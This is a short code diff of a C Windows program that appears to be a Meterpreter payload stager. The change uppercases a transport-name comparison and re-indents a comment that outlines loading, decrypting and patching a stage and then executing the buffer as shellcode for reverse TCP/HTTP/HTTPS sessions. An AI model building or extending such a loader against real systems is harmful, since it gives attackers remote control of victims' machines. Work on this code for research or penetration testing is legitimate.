@@ -70,7 +70,7 @@ int wmain(int argc, wchar_t *argv[])
 			if (wcscmp(argv[i], L"-t") == 0) { //Transport; available options are reverse_metsvc, REVERSE_HTTP, REVERSE_HTTPS ... case doesn't matter.
 				payload_settings.TRANSPORT = argv[i + 1];
 				_wcsupr(payload_settings.TRANSPORT); // Wide-String-to-uppercase
-				if(wcscmp(payload_settings.TRANSPORT,L"reverse_metsvc") == 0) 
+				if(wcscmp(payload_settings.TRANSPORT,L"REVERSE_METSVC") == 0) 
 				{
 					payload_settings.TRANSPORT = L"METERPRETER_TRANSPORT_SSL";
 				}
@@ -145,23 +145,23 @@ int wmain(int argc, wchar_t *argv[])
 	========
 	Wrapping up what happened so far:
 	if(-f specified)
-	load_stager_from_file
-	else
-	load_stage_from_resource
+		load_stager_from_file
+			else
+				load_stage_from_resource
 
 	---
 	buffer == stage?;
 	if (failed?) set FallbackToStager = true;
 
 	if(FallbackToStager){
-	Act as a "regular" stand-alone meterpreter exe;
-	populate buffer,
-	if(tcp) adjust buffer usng ASM voodoo;
+		Act as a "regular" stand-alone meterpreter exe;
+			populate buffer,
+				if(tcp) adjust buffer usng ASM voodoo;
 	} else {
-	buffer already has the stage,
-	decrypt it,
-	patch it, 
-	do your stuff (socket, url building ..etc.)
+		buffer already has the stage,
+			decrypt it,
+				patch it, 
+					do your stuff (socket, url building ..etc.)
 	}
 	now buffer == stage!!
 	((void (*)())buffer)();
